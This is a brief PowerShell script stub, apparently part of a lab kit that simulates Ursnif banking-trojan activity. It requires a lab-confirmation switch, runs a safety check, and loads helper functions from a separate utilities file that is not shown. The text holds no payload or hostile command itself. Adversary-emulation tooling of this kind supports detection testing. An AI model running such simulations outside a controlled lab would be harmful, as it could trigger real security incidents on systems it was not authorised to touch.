[CmdletBinding()]param([switch]$LabConfirmed)
. "$PSScriptRoot\UrsnifGiftSim-utilities.ps1";Assert-UrsnifGiftSafety -LabConfirmed:$LabConfirmed;$p=Initialize-UrsnifGiftEnvironment
